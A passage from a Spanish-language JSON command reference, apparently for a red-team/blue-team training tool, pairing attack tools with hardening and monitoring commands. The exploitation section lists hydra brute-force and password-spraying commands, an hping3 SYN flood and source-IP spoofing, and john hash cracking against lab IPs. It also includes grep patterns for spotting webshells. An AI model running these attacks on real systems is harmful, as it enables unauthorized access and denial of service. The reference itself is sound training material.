            "description": "Muestra la ruta que toman los paquetes para llegar a un destino.",
            "syntax": "traceroute [opciones] [destino]",
            "category": "reconnaissance",
            "team": "both",
            "examples": [
              {
                "command": "traceroute 10.0.10.5",
                "description": "Muestra la ruta completa al destino"
              },
              {
                "command": "traceroute -n 10.0.10.5",
                "description": "No resuelve nombres de host (más rápido)"
              },
              {
                "command": "traceroute -m 20 10.0.10.5",
                "description": "Máximo 20 saltos"
              }
            ],
            "commonFlags": [
              { "flag": "-n", "description": "No resuelve nombres DNS" },
              { "flag": "-m", "description": "Número máximo de saltos" },
              { "flag": "-w", "description": "Tiempo de espera por respuesta" },
              { "flag": "-I", "description": "Usa ICMP ECHO en lugar de UDP" }
            ],
            "useCases": [
              "Identificar cuellos de botella en la red",
              "Descubrir la topología de red",
              "Diagnosticar problemas de enrutamiento",
              "Mapear la infraestructura de red del objetivo"
            ]
          },
          {
            "name": "ss",
            "fullName": "Socket Statistics",
            "description": "Muestra estadísticas de sockets de red. Reemplazo moderno de netstat.",
            "syntax": "ss [opciones]",
            "category": "reconnaissance",
            "team": "blue",
            "examples": [
              {
                "command": "ss -tulnp",
                "description": "Muestra todos los puertos TCP/UDP escuchando con procesos"
              },
              {
                "command": "ss -s",
                "description": "Muestra estadísticas de sockets"
              },
              {
                "command": "ss -a",
                "description": "Muestra todos los sockets (establecidos y escuchando)"
              },
              {
                "command": "ss state established",
                "description": "Muestra solo conexiones establecidas"
              }
            ],
            "commonFlags": [
              { "flag": "-t", "description": "Muestra sockets TCP" },
              { "flag": "-u", "description": "Muestra sockets UDP" },
              { "flag": "-l", "description": "Muestra sockets escuchando" },
              { "flag": "-n", "description": "No resuelve nombres de servicio" },
              { "flag": "-p", "description": "Muestra el proceso usando el socket" },
              { "flag": "-a", "description": "Muestra todos los sockets" },
              { "flag": "-s", "description": "Muestra estadísticas de sockets" }
            ],
            "useCases": [
              "Detectar puertos abiertos y servicios escuchando",
              "Identificar conexiones sospechosas",
              "Monitoreo de red en tiempo real",
              "Análisis de tráfico de red"
            ]
          }
        ]
      },
      {
        "id": "exploitation",
        "name": "Explotación y Ataque",
        "icon": "swords",
        "color": "bg-red-600",
        "description": "Herramientas para pruebas de penetración y explotación de vulnerabilidades",
        "commands": [
          {
            "name": "hydra",
            "fullName": "THC Hydra",
            "description": "Herramienta de fuerza bruta para múltiples protocolos de autenticación.",
            "syntax": "hydra [opciones] [servidor] [servicio]",
            "category": "exploitation",
            "team": "red",
            "examples": [
              {
                "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.10.5",
                "description": "Ataque de fuerza bruta SSH con wordlist"
              },
              {
                "command": "hydra -L users.txt -P pass.txt 10.0.10.5 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"",
                "description": "Ataque a formulario web con listas de usuarios y contraseñas"
              },
              {
                "command": "hydra -l root -P passwords.txt -t 4 ftp://10.0.10.5",
                "description": "Ataque FTP con 4 hilos paralelos"
              },
              {
                "command": "hydra -L users.txt -p password123 smb://10.0.10.5",
                "description": "Password spraying contra SMB"
              }
            ],
            "commonFlags": [
              { "flag": "-l", "description": "Usuario específico" },
              { "flag": "-L", "description": "Lista de usuarios" },
              { "flag": "-p", "description": "Contraseña específica" },
              { "flag": "-P", "description": "Lista de contraseñas" },
              { "flag": "-t", "description": "Número de hilos paralelos" },
              { "flag": "-w", "description": "Tiempo de espera entre intentos" },
              { "flag": "-f", "description": "Detiene al encontrar credenciales válidas" },
              { "flag": "-V", "description": "Modo verbose (muestra intentos)" },
              { "flag": "-s", "description": "Puerto específico" }
            ],
            "protocols": [
              "SSH", "FTP", "HTTP/HTTPS", "SMB", "RDP", "MySQL", 
              "PostgreSQL", "SMTP", "POP3", "IMAP", "VNC", "Telnet"
            ],
            "useCases": [
              "Auditoría de contraseñas débiles",
              "Pentesting de autenticación",
              "Recuperación de credenciales",
              "Pruebas de políticas de contraseñas"
            ],
            "warnings": [
              "⚠️ RUIDOSO: Genera muchos logs y puede activar sistemas de defensa",
              "⚠️ Puede bloquear cuentas si hay políticas de lockout",
              "⚠️ Ilegal sin autorización explícita",
              "⚠️ Puede causar denegación de servicio no intencional"
            ],
            "defenseCounters": [
              "Implementar fail2ban o sistemas similares",
              "Políticas de lockout de cuentas",
              "Autenticación multifactor (MFA)",
              "Monitoreo de intentos fallidos de login",
              "Rate limiting en servicios de autenticación"
            ]
          },
          {
            "name": "hping3",
            "fullName": "hping version 3",
            "description": "Generador y analizador de paquetes TCP/IP. Útil para pruebas de firewall y ataques DoS.",
            "syntax": "hping3 [opciones] [objetivo]",
            "category": "exploitation",
            "team": "red",
            "examples": [
              {
                "command": "hping3 -S 10.0.10.5 -p 80",
                "description": "Envía paquetes SYN al puerto 80"
              },
              {
                "command": "hping3 --flood -S 10.0.10.5",
                "description": "SYN flood (ataque DoS)"
              },
              {
                "command": "hping3 -1 10.0.10.5",
                "description": "Envía paquetes ICMP (ping mejorado)"
              },
              {
                "command": "hping3 -S -p ++1 10.0.10.5",
                "description": "Escaneo de puertos incrementando el puerto de destino"
              }
            ],
            "commonFlags": [
              { "flag": "-S", "description": "Establece flag SYN" },
              { "flag": "-A", "description": "Establece flag ACK" },
              { "flag": "-F", "description": "Establece flag FIN" },
              { "flag": "-p", "description": "Puerto de destino" },
              { "flag": "--flood", "description": "Modo flood (envía paquetes lo más rápido posible)" },
              { "flag": "-c", "description": "Número de paquetes a enviar" },
              { "flag": "-i", "description": "Intervalo entre paquetes" },
              { "flag": "-1", "description": "Modo ICMP" },
              { "flag": "-2", "description": "Modo UDP" },
              { "flag": "-a", "description": "Falsifica dirección IP de origen" }
            ],
            "useCases": [
              "Pruebas de reglas de firewall",
              "Evasión de IDS/IPS",
              "Simulación de ataques DoS",
              "Auditoría de seguridad de red",
              "Traceroute avanzado"
            ],
            "warnings": [
              "⚠️ MUY RUIDOSO: Detectado fácilmente por IDS/IPS",
              "⚠️ Puede causar denegación de servicio real",
              "⚠️ Requiere permisos root",
              "⚠️ Uso malicioso es ilegal"
            ],
            "defenseCounters": [
              "Implementar rate limiting en firewall",
              "Configurar SYN cookies para prevenir SYN flood",
              "Monitoreo de tráfico anómalo con IDS",
              "Filtrado de paquetes con direcciones IP falsificadas"
            ]
          },
          {
            "name": "john",
            "fullName": "John the Ripper",
            "description": "Crackeador de contraseñas offline. Soporta múltiples formatos de hash.",
            "syntax": "john [opciones] [archivo_hash]",
            "category": "exploitation",
            "team": "red",
            "examples": [
              {
                "command": "john hashes.txt",
                "description": "Cracking con wordlist por defecto"
              },
              {
                "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
                "description": "Cracking con wordlist personalizada"
              },
              {
                "command": "john --format=NT hashes.txt",
                "description": "Especifica formato de hash (NTLM)"
              },
              {
                "command": "john --show hashes.txt",
                "description": "Muestra contraseñas crackeadas"
              }
            ],
            "commonFlags": [
              { "flag": "--wordlist", "description": "Especifica archivo de wordlist" },
              { "flag": "--format", "description": "Formato de hash (MD5, SHA256, NT, etc.)" },
              { "flag": "--show", "description": "Muestra contraseñas ya crackeadas" },
              { "flag": "--incremental", "description": "Modo de fuerza bruta" },
              { "flag": "--rules", "description": "Aplica reglas de mutación" }
            ],
            "supportedHashes": [
              "MD5", "SHA-1", "SHA-256", "SHA-512", "NTLM", "bcrypt", 
              "Linux shadow", "Windows LM/NT", "MySQL", "PostgreSQL", "Office"
            ],
            "useCases": [
              "Auditoría de contraseñas",
              "Recuperación de contraseñas",
              "Análisis de fortaleza de contraseñas",
              "Pentesting post-explotación"
            ]
          },
          {
            "name": "nikto",
            "fullName": "Nikto Web Scanner",
            "description": "Escáner de vulnerabilidades de servidores web.",
            "syntax": "nikto -h [host]",
            "category": "exploitation",
            "team": "red",
            "examples": [
              {
                "command": "nikto -h http://10.0.10.5",
                "description": "Escaneo básico de servidor web"
              },
              {
                "command": "nikto -h http://10.0.10.5 -ssl",
                "description": "Escaneo de servidor HTTPS"
              },
              {
                "command": "nikto -h http://10.0.10.5 -Tuning 123",
                "description": "Escaneo específico (1=XSS, 2=SQLi, 3=Directory traversal)"
              }
            ],
            "commonFlags": [
              { "flag": "-h", "description": "Host objetivo" },
              { "flag": "-ssl", "description": "Fuerza uso de SSL/TLS" },
              { "flag": "-port", "description": "Puerto específico" },
              { "flag": "-Tuning", "description": "Tipo de pruebas a realizar" }
            ],
            "useCases": [
              "Descubrimiento de vulnerabilidades web",
              "Auditoría de configuración de servidores",
              "Identificación de versiones obsoletas",
              "Detección de archivos y directorios sensibles"
            ]
          }
        ]
      },
      {
        "id": "defense-hardening",
        "name": "Defensa y Hardening",
        "icon": "shield",
        "color": "bg-blue-600",
        "description": "Comandos para asegurar y endurecer sistemas",
        "commands": [
          {
            "name": "ufw",
            "fullName": "Uncomplicated Firewall",
            "description": "Frontend simplificado para iptables. Gestión de firewall en Ubuntu/Debian.",
            "syntax": "sudo ufw [comando]",
            "category": "defense",
            "team": "blue",
            "examples": [
              {
                "command": "sudo ufw enable",
                "description": "Activa el firewall"
              },
              {
                "command": "sudo ufw status",
                "description": "Muestra el estado y reglas actuales"
              },
              {
                "command": "sudo ufw allow 22/tcp",
                "description": "Permite SSH (puerto 22)"
              },
              {
                "command": "sudo ufw allow from 192.168.1.0/24 to any port 3306",
                "description": "Permite MySQL solo desde la subred local"
              },
              {
                "command": "sudo ufw deny 23",
                "description": "Bloquea Telnet (puerto 23)"
              },
              {
                "command": "sudo ufw deny from 192.168.1.100",
                "description": "Bloquea una IP específica"
              },
              {
                "command": "sudo ufw delete allow 80",
                "description": "Elimina una regla"
              },
              {
                "command": "sudo ufw reset",
                "description": "Resetea el firewall a configuración por defecto"
              }
            ],
            "commonCommands": [
              { "command": "enable", "description": "Activa el firewall y lo configura para iniciar con el sistema" },
              { "command": "disable", "description": "Desactiva el firewall" },
              { "command": "status", "description": "Muestra estado y reglas" },
              { "command": "status numbered", "description": "Muestra reglas numeradas" },
              { "command": "allow", "description": "Permite tráfico" },
              { "command": "deny", "description": "Bloquea tráfico" },
              { "command": "delete", "description": "Elimina una regla" },
              { "command": "reset", "description": "Elimina todas las reglas" },
              { "command": "reload", "description": "Recarga las reglas sin interrumpir conexiones" }
            ],
            "securityBestPractices": [
              "✅ Siempre permitir SSH ANTES de activar el firewall",
              "✅ Usar el principio de menor privilegio (denegar todo, permitir lo necesario)",
              "✅ Documentar cada regla con comentarios",
              "✅ Revisar reglas regularmente con 'status numbered'",
              "✅ Probar reglas antes de aplicar en producción"
            ],
            "useCases": [
              "Bloquear puertos innecesarios",
              "Implementar segmentación de red",
              "Contener ataques de fuerza bruta",
              "Crear política de firewall zero-trust"
            ],
            "securityUseCases": [
              {
                "scenario": "Servidor Web Básico",
                "command": "sudo ufw allow 80/tcp && sudo ufw allow 443/tcp",
                "description": "Permite tráfico HTTP y HTTPS"
              },
              {
                "scenario": "Bloquear Atacante",
                "command": "sudo ufw deny from 192.168.1.100",
                "description": "Bloquea IP maliciosa"
              }
            ]
          },
          {
            "name": "fail2ban-client",
            "fullName": "Fail2Ban Client",
            "description": "Sistema de prevención de intrusiones que monitorea logs y banea IPs con comportamiento malicioso.",
            "syntax": "fail2ban-client [comando] [jail] [acción]",
            "category": "defense",
            "team": "blue",
            "examples": [
              {
                "command": "fail2ban-client status",
                "description": "Muestra el estado general"
              },
              {
                "command": "fail2ban-client status sshd",
                "description": "Estado específico de la jail de SSH"
              },
              {
                "command": "fail2ban-client set sshd banip 192.168.1.100",
                "description": "Banea manualmente una IP"
              },
              {
                "command": "fail2ban-client set sshd unbanip 192.168.1.100",
                "description": "Desbanea una IP"
              }
            ],
            "commonCommands": [
              { "command": "status", "description": "Estado del servicio" },
              { "command": "status [jail]", "description": "Estado de una jail específica" },
              { "command": "set [jail] banip [ip]", "description": "Banea una IP" },
              { "command": "set [jail] unbanip [ip]", "description": "Desbanea una IP" },
              { "command": "reload", "description": "Recarga la configuración" }
            ],
            "commonJails": [
              "sshd - Protección SSH",
              "apache-auth - Autenticación Apache",
              "nginx-limit-req - Rate limiting Nginx",
              "postfix - Servidor de correo"
            ],
            "useCases": [
              "Prevenir ataques de fuerza bruta",
              "Protección automática contra escaneos",
              "Bloqueo de IPs maliciosas",
              "Complemento de firewall con detección inteligente"
            ],
            "configuration": {
              "location": "/etc/fail2ban/jail.local",
              "keyParameters": [
                "bantime - Duración del baneo (ej: 10m, 1h, 1d)",
                "findtime - Ventana de tiempo para contar intentos",
                "maxretry - Número de intentos permitidos",
                "action - Acción a tomar (ban, email, etc.)"
              ]
            }
          },
          {
            "name": "chmod",
            "fullName": "Change Mode",
            "description": "Cambia los permisos de archivos y directorios en sistemas Unix/Linux.",
            "syntax": "chmod [opciones] [modo] [archivo]",
            "category": "defense",
            "team": "blue",
            "examples": [
              {
                "command": "chmod 640 /var/www/html/db_config.php",
                "description": "Propietario: lectura/escritura, Grupo: lectura, Otros: ninguno"
              },
              {
                "command": "chmod 700 ~/.ssh",
                "description": "Permisos seguros para directorio SSH"
              },
              {
                "command": "chmod 600 ~/.ssh/id_rsa",
                "description": "Permisos seguros para llave privada SSH"
              },
              {
                "command": "chmod u+x script.sh",
                "description": "Añade permiso de ejecución para el propietario"
              },
              {
                "command": "chmod -R 755 /var/www/html",
                "description": "Recursivo: directorios ejecutables, archivos legibles"
              }
            ],
            "permissionSystem": {
              "numeric": {
                "description": "Sistema octal de 3 dígitos (Propietario-Grupo-Otros)",
                "values": [
                  "0 = --- (ningún permiso)",
                  "1 = --x (ejecución)",
                  "2 = -w- (escritura)",
                  "3 = -wx (escritura + ejecución)",
                  "4 = r-- (lectura)",
                  "5 = r-x (lectura + ejecución)",
                  "6 = rw- (lectura + escritura)",
                  "7 = rwx (todos los permisos)"
                ]
              },
              "symbolic": {
                "description": "Notación simbólica (u=usuario, g=grupo, o=otros, a=todos)",
                "operators": [
                  "+ añade permisos",
                  "- quita permisos",
                  "= establece permisos exactos"
                ],
                "permissions": [
                  "r = lectura",
                  "w = escritura",
                  "x = ejecución"
                ]
              }
            },
            "commonPatterns": [
              { "pattern": "644", "description": "Archivos normales (rw-r--r--)", "use": "Documentos, archivos de configuración" },
              { "pattern": "640", "description": "Archivos sensibles (rw-r-----)", "use": "Archivos con contraseñas, configs privadas" },
              { "pattern": "600", "description": "Archivos privados (rw-------)", "use": "Llaves SSH, archivos personales" },
              { "pattern": "755", "description": "Directorios/ejecutables (rwxr-x---)", "use": "Scripts, directorios públicos" },
              { "pattern": "750", "description": "Directorios de grupo (rwxr-x---)", "use": "Directorios compartidos por grupo" },
              { "pattern": "700", "description": "Directorios privados (rwx------)", "use": ".ssh, directorios personales" }
            ],
            "securityBestPractices": [
              "✅ Nunca usar 777 en producción",
              "✅ Archivos de configuración con DB: 640 o más restrictivo",
              "✅ Directorio .ssh: 700",
              "✅ Llaves privadas SSH: 600",
              "✅ Llaves públicas SSH: 644",
              "✅ Scripts ejecutables: 750 o 755",
              "✅ Logs sensibles: 640"
            ],
            "commonFlags": [
              { "flag": "-R", "description": "Recursivo (aplica a todos los archivos y subdirectorios)" },
              { "flag": "-v", "description": "Verbose (muestra cambios)" },
              { "flag": "--reference", "description": "Copia permisos de otro archivo" }
            ],
            "useCases": [
              "Asegurar archivos de configuración",
              "Proteger credenciales y secretos",
              "Cumplir con políticas de seguridad",
              "Prevenir acceso no autorizado",
              "Hardening post-instalación"
            ]
          },
          {
            "name": "systemctl",
            "fullName": "System Control",
            "description": "Controla el sistema systemd y sus servicios.",
            "syntax": "systemctl [comando] [servicio]",
            "category": "defense",
            "team": "blue",
            "examples": [
              {
                "command": "systemctl restart sshd",
                "description": "Reinicia el servicio SSH para aplicar cambios de configuración"
              },
              {
                "command": "systemctl status apache2",
                "description": "Muestra el estado del servidor web Apache"
              },
              {
                "command": "systemctl stop telnet.service",
                "description": "Detiene el servicio Telnet inseguro"
              },
              {
                "command": "systemctl disable telnet.service",
                "description": "Evita que Telnet se inicie automáticamente"
              },
              {
                "command": "systemctl enable fail2ban",
                "description": "Configura fail2ban para iniciarse con el sistema"
              }
            ],
            "commonCommands": [
              { "command": "start", "description": "Inicia un servicio" },
              { "command": "stop", "description": "Detiene un servicio" },
              { "command": "restart", "description": "Reinicia un servicio" },
              { "command": "reload", "description": "Recarga la configuración sin reiniciar" },
              { "command": "status", "description": "Muestra el estado del servicio" },
              { "command": "enable", "description": "Habilita inicio automático" },
              { "command": "disable", "description": "Deshabilita inicio automático" },
              { "command": "is-active", "description": "Verifica si está activo" },
              { "command": "is-enabled", "description": "Verifica si está habilitado" }
            ],
            "useCases": [
              "Aplicar cambios de configuración de seguridad",
              "Deshabilitar servicios innecesarios",
              "Respuesta a incidentes (detener servicios comprometidos)",
              "Gestión de servicios de seguridad (firewall, IDS)"
            ]
          }
        ]
      },
      {
        "id": "monitoring-analysis",
        "name": "Monitoreo y Análisis",
        "icon": "activity",
        "color": "bg-green-600",
        "description": "Herramientas para monitoreo de sistemas y análisis de seguridad",
        "commands": [
          {
            "name": "top",
            "fullName": "Table of Processes",
            "description": "Monitor de procesos en tiempo real. Muestra uso de CPU, memoria y procesos activos.",
            "syntax": "top [opciones]",
            "category": "monitoring",
            "team": "blue",
            "examples": [
              {
                "command": "top",
                "description": "Visualización en tiempo real del sistema"
              },
              {
                "command": "top -u www-data",
                "description": "Muestra solo procesos del usuario www-data"
              },
              {
                "command": "top -p 1234",
                "description": "Monitorea un proceso específico por PID"
              }
            ],
            "keyIndicators": [
              {
                "metric": "Load Average",
                "description": "Promedio de carga del sistema (1min, 5min, 15min)",
                "interpretation": "Valores > número de CPUs indican sobrecarga"
              },
              {
                "metric": "%CPU",
                "description": "Porcentaje de CPU usado por proceso",
                "interpretation": "Valores consistentemente altos (>80%) pueden indicar DoS o proceso descontrolado"
              },
              {
                "metric": "%MEM",
                "description": "Porcentaje de memoria RAM usado",
                "interpretation": "Monitorear para detectar memory leaks o ataques"
              },
              {
                "metric": "zombie processes",
                "description": "Procesos terminados pero no limpiados",
                "interpretation": "Múltiples zombies pueden indicar problemas"
              }
            ],
            "interactiveCommands": [
              { "key": "k", "action": "Matar un proceso (kill)" },
              { "key": "r", "action": "Cambiar prioridad (renice)" },
              { "key": "M", "action": "Ordenar por uso de memoria" },
              { "key": "P", "action": "Ordenar por uso de CPU" },
              { "key": "h", "action": "Ayuda" },
              { "key": "q", "action": "Salir" }
            ],
            "useCases": [
              "Detectar ataques DoS (CPU al 100%)",
              "Identificar procesos sospechosos",
              "Monitorear performance del sistema",
              "Diagnosticar problemas de recursos"
            ],
            "securityIndicators": [
              "🚨 CPU >90% de forma sostenida = Posible DoS",
              "🚨 Procesos desconocidos con alto uso de recursos",
              "🚨 Múltiples conexiones de red desde un proceso",
              "🚨 Procesos ejecutándose como root sin razón"
            ]
          },
          {
            "name": "htop",
            "fullName": "Interactive Process Viewer",
            "description": "Versión mejorada y visual de top con interfaz interactiva.",
            "syntax": "htop",
            "category": "monitoring",
            "team": "blue",
            "examples": [
              {
                "command": "htop",
                "description": "Interfaz interactiva mejorada"
              },
              {
                "command": "htop -u apache",
                "description": "Filtra por usuario específico"
              }
            ],
            "advantages": [
              "Interfaz más intuitiva con colores",
              "Navegación con mouse",
              "Visualización de árbol de procesos",
              "Búsqueda y filtrado más fácil",
              "Muestra todos los cores de CPU"
            ],
            "useCases": [
              "Alternativa más user-friendly a top",
              "Análisis visual de recursos",
              "Gestión interactiva de procesos"
            ]
          },
          {
            "name": "journalctl",
            "fullName": "Journal Control",
            "description": "Consulta los logs del sistema systemd. Esencial para análisis forense y detección de intrusiones.",
            "syntax": "journalctl [opciones]",
            "category": "monitoring",
            "team": "blue",
            "examples": [
              {
                "command": "journalctl -u sshd",
                "description": "Logs del servicio SSH"
              },
              {
                "command": "journalctl -u sshd --since today",
                "description": "Logs de SSH de hoy"
              },
              {
                "command": "journalctl -u sshd --since \"2024-01-01 00:00:00\" --until \"2024-01-01 23:59:59\"",
                "description": "Logs de SSH de una fecha específica"
              },
              {
                "command": "journalctl -p err",
                "description": "Solo mensajes de error"
              },
              {
                "command": "journalctl -f",
                "description": "Modo follow (como tail -f)"
              },
              {
                "command": "journalctl _PID=1234",
                "description": "Logs de un proceso específico"
              }
            ],
            "commonFlags": [
              { "flag": "-u", "description": "Filtra por unidad/servicio" },
              { "flag": "-f", "description": "Follow (tiempo real)" },
              { "flag": "-p", "description": "Filtra por prioridad (emerg, alert, crit, err, warning, notice, info, debug)" },
              { "flag": "--since", "description": "Desde una fecha/hora" },
              { "flag": "--until", "description": "Hasta una fecha/hora" },
              { "flag": "-n", "description": "Número de líneas a mostrar" },
              { "flag": "-r", "description": "Orden inverso (más recientes primero)" },
              { "flag": "--no-pager", "description": "Salida sin paginador" }
            ],
            "securityUseCases": [
              {
                "scenario": "Detectar Fuerza Bruta SSH",
                "command": "journalctl -u sshd | grep 'Failed password'",
                "description": "Busca intentos fallidos de login"
              },
              {
                "scenario": "Análisis Post-Incidente",
                "command": "journalctl --since \"2024-01-15 14:00\" --until \"2024-01-15 15:00\" -p warning",
                "description": "Logs de alerta durante ventana de incidente"
              },
              {
                "scenario": "Monitoreo en Tiempo Real",
                "command": "journalctl -f -p err",
                "description": "Stream de errores en vivo"
              },
              {
                "scenario": "Auditoría de Servicio",
                "command": "journalctl -u apache2 --since today",
                "description": "Toda la actividad del servidor web hoy"
              }
            ],
            "forensicsPatterns": [
              "Failed password for = Fuerza bruta",
              "Accepted password for = Login exitoso",
              "Connection closed = Desconexión",
              "Invalid user = Intento de usuario inexistente",
              "Break-in attempt = Intento de intrusión detectado"
            ]
          },
          {
            "name": "grep",
            "fullName": "Global Regular Expression Print",
            "description": "Busca patrones de texto en archivos. Fundamental para análisis de logs.",
            "syntax": "grep [opciones] [patrón] [archivo]",
            "category": "monitoring",
            "team": "blue",
            "examples": [
              {
                "command": "grep 'Failed password' /var/log/auth.log",
                "description": "Busca intentos fallidos de autenticación"
              },
              {
                "command": "grep -i 'error' /var/log/apache2/error.log",
                "description": "Búsqueda case-insensitive de errores"
              },
              {
                "command": "grep -r 'password' /var/www/html/",
                "description": "Búsqueda recursiva de contraseñas hardcodeadas"
              },
              {
                "command": "grep -c 'Failed' /var/log/auth.log",
                "description": "Cuenta número de fallos"
              },
              {
                "command": "grep -E '192\\.168\\.[0-9]+\\.[0-9]+' access.log",
                "description": "Busca IPs con expresión regular"
              }
            ],
            "commonFlags": [
              { "flag": "-i", "description": "Case-insensitive" },
              { "flag": "-r", "description": "Recursivo en directorios" },
              { "flag": "-v", "description": "Invierte la búsqueda (líneas que NO coinciden)" },
              { "flag": "-c", "description": "Cuenta las coincidencias" },
              { "flag": "-n", "description": "Muestra número de línea" },
              { "flag": "-E", "description": "Expresiones regulares extendidas" },
              { "flag": "-A", "description": "Muestra N líneas DESPUÉS del match" },
              { "flag": "-B", "description": "Muestra N líneas ANTES del match" },
              { "flag": "-C", "description": "Muestra N líneas de CONTEXTO (antes y después)" }
            ],
            "securityPatterns": [
              {
                "pattern": "grep 'Failed password' /var/log/auth.log | wc -l",
                "use": "Contar intentos de fuerza bruta"
              },
              {
                "pattern": "grep -E '(error|warning|critical)' /var/log/syslog",
                "use": "Buscar múltiples niveles de severidad"
              },
              {
                "pattern": "grep -i 'sql' /var/log/apache2/access.log | grep -v 'mysql'",
                "use": "Detectar posibles inyecciones SQL (excluyendo legítimas)"
              },
              {
                "pattern": "grep -r 'eval(' /var/www/html/ --include='*.php'",
                "use": "Buscar posibles webshells"
              }
            ],
            "useCases": [
              "Análisis de logs de seguridad",
              "Búsqueda de patrones de ataque",
              "Auditoría de código",
              "Correlación de eventos"
            ]
          },
          {
            "name": "ps",
            "fullName": "Process Status",
            "description": "Muestra información de procesos en ejecución.",
            "syntax": "ps [opciones]",
            "category": "monitoring",
            "team": "blue",
            "examples": [
              {
                "command": "ps aux",
                "description": "Lista todos los procesos con detalles"
              },
              {
                "command": "ps aux | grep apache",
                "description": "Busca procesos de Apache"
              },
              {
                "command": "ps -ef --forest",
                "description": "Muestra árbol de procesos"
              },
              {
                "command": "ps -u www-data",
                "description": "Procesos del usuario www-data"
              }
            ],
            "commonFlags": [
              { "flag": "a", "description": "Todos los procesos con terminal" },
              { "flag": "u", "description": "Formato orientado al usuario" },
              { "flag": "x", "description": "Incluye procesos sin terminal" },
              { "flag": "-e", "description": "Todos los procesos" },
              { "flag": "-f", "description": "Formato completo" },
              { "flag": "--forest", "description": "Muestra jerarquía" }
            ],
            "useCases": [
              "Identificar procesos sospechosos",
              "Verificar servicios en ejecución",
              "Análisis de uso de recursos",
              "Caza de amenazas"
            ],
            "securityChecks": [
              "Procesos ejecutándose como root sin razón",
              "Nombres de proceso inusuales o aleatorios",
              "Múltiples instancias de un mismo proceso",
              "Procesos con alto uso de CPU/memoria",
              "Procesos escuchando en puertos no estándar"
            ]
          },
          {
            "name": "sha256sum",
            "fullName": "SHA-256 Checksum",
            "description": "Calcula y verifica hashes SHA-256 de archivos. Esencial para detección de integridad.",
            "syntax": "sha256sum [opciones] [archivo]",
            "category": "monitoring",
            "team": "blue",
            "examples": [
              {
                "command": "sha256sum /var/www/html/index.php",
                "description": "Calcula hash de un archivo"
              },
              {
                "command": "sha256sum -c checksums.txt",
                "description": "Verifica integridad usando archivo de checksums"
              },
              {
                "command": "sha256sum /var/www/html/* > website_hashes.txt",
                "description": "Crea archivo de checksums para sitio web"
              }
            ],
            "useCases": [
              "Detectar modificaciones no autorizadas",
              "Verificar integridad de archivos críticos",
              "Análisis forense",
              "Detección de webshells y backdoors"
            ],
            "workflowExample": {
              "step1": "Crear baseline: sha256sum /var/www/html/*.php > baseline.txt",
              "step2": "Verificar regularmente: sha256sum -c baseline.txt",
              "step3": "Investigar diferencias si el hash no coincide"
            },
            "securityBestPractices": [
              "Crear hashes de archivos críticos después de instalación limpia",
              "Almacenar hashes en ubicación segura (fuera del servidor)",
              "Automatizar verificación con cron",
              "Combinar con IDS basado en host (HIDS)"
            ]
          }
        ]
      },
      {
        "id": "system-admin",
        "name": "Administración de Sistema",
        "icon": "settings",
        "color": "bg-gray-600",
        "description": "Comandos básicos de administración de sistemas Linux",
        "commands": [
          {
            "name": "ssh",
            "fullName": "Secure Shell",
            "description": "Protocolo para acceso remoto seguro a sistemas.",
            "syntax": "ssh [usuario]@[host]",
            "category": "admin",
            "team": "both",
            "examples": [
              {
                "command": "ssh root@10.0.10.5",
                "description": "Conexión SSH como root"
              },
              {
                "command": "ssh -p 2222 admin@10.0.10.5",
                "description": "Conexión a puerto personalizado"
              },
              {
                "command": "ssh -i ~/.ssh/id_rsa user@10.0.10.5",
                "description": "Autenticación con llave privada"
              }
            ],
            "commonFlags": [
              { "flag": "-p", "description": "Puerto específico" },
              { "flag": "-i", "description": "Archivo de identidad (llave privada)" },
              { "flag": "-v", "description": "Modo verbose para debugging" },
              { "flag": "-L", "description": "Port forwarding local" },
              { "flag": "-D", "description": "Dynamic port forwarding (SOCKS proxy)" }
            ],
            "securityBestPractices": [
              "✅ Deshabilitar PermitRootLogin en /etc/ssh/sshd_config",
              "✅ Usar autenticación por llave en lugar de contraseña",
              "✅ Cambiar puerto por defecto (22)",
              "✅ Implementar fail2ban",
              "✅ Usar AllowUsers o AllowGroups para limitar acceso",
              "✅ Habilitar MFA (autenticación multifactor)"
            ]
          },
          {
            "name": "ls",
            "fullName": "List",
            "description": "Lista archivos y directorios.",
            "syntax": "ls [opciones] [ruta]",
            "category": "admin",
            "team": "both",
            "examples": [
              {
                "command": "ls -la /var/www/html",
                "description": "Lista detallada incluyendo archivos ocultos"
              },
              {
                "command": "ls -lh",
                "description": "Lista con tamaños human-readable"
              },
              {
                "command": "ls -lt",
                "description": "Ordena por fecha de modificación"
              }
            ],
            "commonFlags": [
              { "flag": "-l", "description": "Formato largo (permisos, propietario, tamaño, fecha)" },
              { "flag": "-a", "description": "Incluye archivos ocultos (empiezan con .)" },
              { "flag": "-h", "description": "Tamaños human-readable (KB, MB, GB)" },
              { "flag": "-t", "description": "Ordena por fecha de modificación" },
              { "flag": "-r", "description": "Orden inverso" },
              { "flag": "-R", "description": "Recursivo (subdirectorios)" }
            ]
          },
          {
            "name": "cat",
            "fullName": "Concatenate",
            "description": "Muestra el contenido de archivos.",
            "syntax": "cat [opciones] [archivo]",
            "category": "admin",
            "team": "both",
            "examples": [
              {
                "command": "cat /var/www/html/db_config.php",
                "description": "Muestra contenido de archivo de configuración"
              },
              {
                "command": "cat -n /etc/passwd",
                "description": "Muestra con números de línea"
              }
            ],
            "commonFlags": [
              { "flag": "-n", "description": "Numera las líneas" },
              { "flag": "-b", "description": "Numera solo líneas no vacías" },
              { "flag": "-A", "description": "Muestra caracteres no imprimibles" }
            ],
            "securityNote": "⚠️ Verificar permisos antes de leer archivos sensibles. Archivos como db_config.php no deberían ser world-readable."
          },
          {
            "name": "nano",
            "fullName": "Nano's ANOther editor",
            "description": "Editor de texto simple para terminal.",
            "syntax": "nano [archivo]",
            "category": "admin",
            "team": "blue",
            "examples": [
              {
                "command": "sudo nano /etc/ssh/sshd_config",
                "description": "Edita configuración SSH"
              },
              {
                "command": "nano /var/www/html/index.php",
                "description": "Edita archivo web"
              }
            ],
            "keyboardShortcuts": [
              { "keys": "Ctrl+O", "action": "Guardar (Write Out)" },
              { "keys": "Ctrl+X", "action": "Salir" },
              { "keys": "Ctrl+K", "action": "Cortar línea" },
              { "keys": "Ctrl+U", "action": "Pegar" },
              { "keys": "Ctrl+W", "action": "Buscar" },
              { "keys": "Ctrl+\\", "action": "Buscar y reemplazar" }
            ]
          },
          {
            "name": "whoami",
            "fullName": "Who Am I",
            "description": "Muestra el nombre del usuario actual.",
            "syntax": "whoami",
            "category": "admin",
            "team": "both",
            "examples": [
              {
